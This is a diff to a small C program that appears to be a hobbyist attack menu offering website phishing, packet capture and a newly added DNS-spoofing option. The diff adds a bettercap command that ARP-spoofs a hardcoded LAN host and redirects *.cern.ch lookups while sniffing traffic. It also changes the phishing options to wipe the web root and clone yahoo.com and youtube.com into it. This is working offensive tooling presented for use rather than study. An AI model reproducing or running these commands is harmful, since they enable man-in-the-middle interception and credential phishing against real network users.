@@ -1,6 +1,6 @@
 #include <stdio.h>
 #include <stdlib.h>
-
+#include <string.h>
 
 int main(int args)
 {
@@ -13,7 +13,8 @@ int main(int args)
 	printf("4. Start phshing attack\n");
 	printf("5. Stop Physhing attack\n");
 	printf("6. set up YOUTUBE Physhing attack\n");
-	printf("7. PACKET CAPTURE COMMAND")
+	printf("7. PACKET CAPTURE COMMAND\n");
+	printf("8: Launch dns spoof");
 	scanf("%d",&option);
 	
 	
@@ -32,7 +33,7 @@ int main(int args)
 	else if(option == 3)
 	{
 		//system("service apache2 start");
-		system("cd /var; mkdir www; cd www; mkdir html; cd html; mkdir yahoo; cd yahoo; ls; wget http://yahoo.com ;dir");
+		system("cd /var; mkdir www; cd www; mkdir html; cd html; rm -f index.html; ls; wget http://yahoo.com ;dir");
 		
 		//system("cd .. cd .. cd .. cd .. cd .. cd .. cd . ls");
 
@@ -50,12 +51,27 @@ int main(int args)
 	}
 	else if(option == 6)
 	{
-		system("cd /var; mkdir www; cd www; mkdir html; cd html; mkdir youtube; cd youtube; ls; wget http://youtube.com ;dir");
+		system("cd /var; mkdir www; cd www; mkdir html; cd html; rm -f index.html ; wget http://youtube.com ;");
 	}
 	else if(option ==7)
 	{
 		system("tshark -i eth0");
 
 	}
+	else if(option == 8)
+	{
+		
+		char command[200];
+    		char ip_address[16]; // Assuming IPv4 address
+    
+		//printf("Enter the target IP address: ");
+    		//scanf("%15s", ip_address);
+    
+    		system("bettercap -iface eth0 -eval 'set arp.spoof.fullduplex true; set arp.spoof.target 192.168.100.5; set dns.spoof.address 192.168.100.26; set dns.spoof.all true; set dns.spoof.domains info.cern.ch, *.cern.ch;dns.spoof on; net.sniff on; arp.spoof on'");
 
+    
+    		//system(command);
+    
+
+	}
 }
